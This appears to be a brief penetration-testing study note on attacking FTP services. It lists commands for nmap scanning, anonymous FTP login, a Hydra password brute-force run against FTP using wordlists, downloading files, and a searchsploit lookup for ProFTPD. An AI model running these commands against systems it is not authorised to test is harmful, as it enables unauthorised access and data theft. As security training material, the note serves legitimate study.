# Exploiting FTP

- File Transfer Protocol is a protocol that uses TCP port 21
- Used to facilitate file sharing between a server and client(s)
- FTP authentication requires a username and password
	- Vulnerable to brute force
	- Anonymous access is possible but rare

## Demonstration

```bash
nmap -sV $TRG
ftp $TRG
Name: Anonymous
```

Brute force with Hydra:

```bash
hydra -L common_users.txt -P unix_passwords.txt $TRG -t 4 ftp
```

```bash
# list files
ftp> dir
# download file
ftp> get file.txt
```

```
searchsploit proftpd
```
